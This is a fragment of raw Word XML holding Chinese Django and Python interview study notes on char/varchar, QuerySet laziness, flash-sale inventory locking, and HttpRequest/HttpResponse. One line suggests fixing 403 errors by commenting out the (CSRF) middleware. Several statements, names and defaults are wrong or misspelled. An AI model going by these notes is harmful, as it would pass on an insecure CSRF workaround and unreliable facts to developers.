          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD8F030" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="696" w:name="1340-1535456227692"/>
      <w:bookmarkEnd w:id="696"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> char 长度是固定的，不管你存储的数据是多少他都会都固定的长度。而 varchar 则处可变长度但他要在总长度上加 1 字符，这个用来存储位置。所以在处理速度上 char 要比 varchar 快速很多，但是对费存储空间，所以对存储不大，但在速度上有要求的可以使用 char 类型，反之可以用 varchar 类型。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423CBCF9" w14:textId="2CBF2253" w:rsidR="00FC55DF" w:rsidRPr="00FC55DF" w:rsidRDefault="003547BF" w:rsidP="00FC55DF">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="697" w:name="7613-1535456110140"/>
      <w:bookmarkStart w:id="698" w:name="4534-1535456110289"/>
      <w:bookmarkEnd w:id="697"/>
      <w:bookmarkEnd w:id="698"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>041</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查询集两大特性？惰性执行</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:bookmarkStart w:id="699" w:name="8829-1535456318716"/>
      <w:bookmarkEnd w:id="699"/>
    </w:p>
    <w:p w14:paraId="67AA94BE" w14:textId="3D851198" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="00FC55DF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>特性：</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>惰性执行、缓存 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4403EAE7" w14:textId="769AD3E0" w:rsidR="00FC55DF" w:rsidRPr="003547BF" w:rsidRDefault="00FC55DF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="700" w:name="3675-1535456318716"/>
      <w:bookmarkEnd w:id="700"/>
      <w:r w:rsidRPr="00FC55DF">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>惰性执行是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>指</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建查询集不会访问数据库，直到调用数据时，才会访问数据库，调用数据的情况包括迭代、序列化、与 if 合用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378329C5" w14:textId="23223EB3"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701" w:name="5038-1535456381632"/>
      <w:bookmarkStart w:id="702" w:name="4769-1535456318716"/>
      <w:bookmarkStart w:id="703" w:name="9953-1535456391504"/>
      <w:bookmarkStart w:id="704" w:name="5074-1535456318716"/>
      <w:bookmarkEnd w:id="701"/>
      <w:bookmarkEnd w:id="702"/>
      <w:bookmarkEnd w:id="703"/>
      <w:bookmarkEnd w:id="704"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>043</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电商网站库存问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE64B39" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="705" w:name="5935-1535456318716"/>
      <w:bookmarkEnd w:id="705"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>       一般团购，秒杀，特价之类的活动，这样会使访问量激增，很多人抢购一个商品，作为活动商品， 库存肯定是很有限的。控制库存问题，数据库的事务功能是控制库存超卖的有效方式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E0AFAF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="706" w:name="8953-1535456318716"/>
      <w:bookmarkEnd w:id="706"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）在秒杀的情况下，肯定不能如此频率的去读写数据库，严重影响性能问题，必须使用缓存，将需要秒杀的商品放入缓存中，并使用锁来处理并发情况，先将商品数量增减（加锁、解析）后在进行其他方面的处理，处理失败再将数据递增（加锁、解析）,否则表示交易成功。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C0AE95" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="707" w:name="5463-1535456318716"/>
      <w:bookmarkEnd w:id="707"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）这个肯定不能直接操作数据库的，会挂的。直接读库写库对数据库压力太大了，要用到缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF65415" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="708" w:name="9030-1535456318716"/>
      <w:bookmarkEnd w:id="708"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）首先，多用户并发修改同一条记录时，肯定是后提交的用户将覆盖掉前者提交的结果了。这个直接可以使用加乐观锁的机制去解决高并发的问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B048E2F" w14:textId="787FA563" w:rsidR="001C47AF" w:rsidRPr="001C47AF" w:rsidRDefault="003547BF"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709" w:name="8170-1535456342479"/>
      <w:bookmarkStart w:id="710" w:name="7355-1535456318716"/>
      <w:bookmarkEnd w:id="709"/>
      <w:bookmarkEnd w:id="710"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>044</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HttpRequest </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpResponse </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>是什么</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">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干嘛用的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CF71C5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="711" w:name="6279-1535456318716"/>
      <w:bookmarkEnd w:id="711"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> HttpRequest 是 django 接受用户发送多来的请求报文后，将报文封装到 HttpRequest 对象中去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794C8474" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="712" w:name="1868-1535456318716"/>
      <w:bookmarkEnd w:id="712"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>HttpResponse  返回的是一个应答的数据报文。render 内部已经封装好了 HttpResponse 类。视图的第一个参数必须是 HttpRequest 对象，两点原因：表面上说，他是处理 web 请求的，所以</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078259F1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="713" w:name="3187-1535456318716"/>
      <w:bookmarkEnd w:id="713"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>必须是请求对象，根本上说，他是基于请求的一种 web 框架，所以，必须是请求对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC13982" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="714" w:name="9211-1535456318716"/>
      <w:bookmarkEnd w:id="714"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>因为 view 处理的是一个 request 对象，请求的所有属性我们都可以根据对象属性的查看方法来获取具体的信息：格式：request.属性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C80A97" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="715" w:name="2643-1535456318716"/>
      <w:bookmarkEnd w:id="715"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.path 请求页面的路径，不包含域名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264B1EF2" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="716" w:name="8965-1535456318716"/>
      <w:bookmarkEnd w:id="716"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.get_full_path 获取带参数的路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEEE675" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="717" w:name="5410-1535456318716"/>
      <w:bookmarkEnd w:id="717"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.method 页面的请求方式request.GET GET 请求方式的数据request.POST POST 请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0BE75A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="718" w:name="6296-1535456475801"/>
      <w:bookmarkEnd w:id="718"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.COOKIES 获取 cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B74129" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="719" w:name="7893-1535456318716"/>
      <w:bookmarkEnd w:id="719"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.session 获取 session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024B9718" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="720" w:name="9988-1535456318716"/>
      <w:bookmarkEnd w:id="720"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.FILES 上传图片（请求页面有 enctype="multipart/form-data"属性时 FILES 才有数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F014FD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="721" w:name="2695-1535456318716"/>
      <w:bookmarkEnd w:id="721"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>？a=10 的键和值时怎么产生的，键是开发人员在编写代码时确定下来的，值时根据数据生成或者用户填写的，总之是不确定的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D61FA44" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="722" w:name="5388-1535456318716"/>
      <w:bookmarkEnd w:id="722"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>403 错误：表示资源不可用，服务器理解客户的请求，但是拒绝处理它，通常由于服务器上文件和目录的权限设置导致的 web 访问错误。如何解决：1、把中间件注释。2、在表单内部添加{% scrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CAD0B4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="723" w:name="9184-1535456318716"/>
      <w:bookmarkEnd w:id="723"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>request.GET.get()取值时如果一键多值情况，get 是覆盖的方式获取的。getlist（）可以获取多个值。在一个有键无值的情况下，该键名 c 的值返回空。有键无值：c: getlist 返回的是列表，空列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B5669A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="724" w:name="7035-1535456318716"/>
      <w:bookmarkEnd w:id="724"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在无键无值也没有默认值的情况下，返回的是 None 无键无值：e:None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2DFA49" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="725" w:name="3337-1535456318716"/>
      <w:bookmarkEnd w:id="725"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>HttpResponse 常见属性：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E7A247" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="726" w:name="2280-1535456318716"/>
      <w:bookmarkEnd w:id="726"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>content：                                                                                                     表 示 返 回 的 内 容charset: 表 示        response        采 用 的 编 码 字 符 集 ， 默 认 是         utf-8 status_code:返回的 HTTP 响应状态码 3XX 是对请求继续进一步处理，常见的是重定向。常见方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E495CE1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="727" w:name="3041-1535456318716"/>
      <w:bookmarkEnd w:id="727"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>init:创建 httpResponse 对象完成返回内容的初始化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7CEA78" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="728" w:name="1566-1535456318716"/>
      <w:bookmarkEnd w:id="728"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>set_cookie：设置 Cookie 信息：格式：set_cookies('key','value',max_age=None,expires=None) max_age 是一个整数，表示指定秒数后过期，expires 指定过期时间，默认两个星期后过期。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763BE96A" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="729" w:name="5269-1535456318716"/>
      <w:bookmarkEnd w:id="729"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>write 向响应体中写数据应答对象：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73767008" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="730" w:name="7319-1535456318716"/>
      <w:bookmarkEnd w:id="730"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方式一：render(request,"index.html") 返回一个模板render(request,"index.html", context) 返回一个携带动态数据的页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B4CBBC" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="731" w:name="9066-1535456318716"/>
      <w:bookmarkEnd w:id="731"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方式二：render_to_response("index.html") 返回一个模板页面方式三：redirect("/") 重定向</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF8A345" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="732" w:name="3530-1535456318716"/>
      <w:bookmarkEnd w:id="732"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方式四：HttpResponseRdeirect("/") 实现页面跳转功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709C5BD7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="733" w:name="3036-1535456534511"/>
      <w:bookmarkEnd w:id="733"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
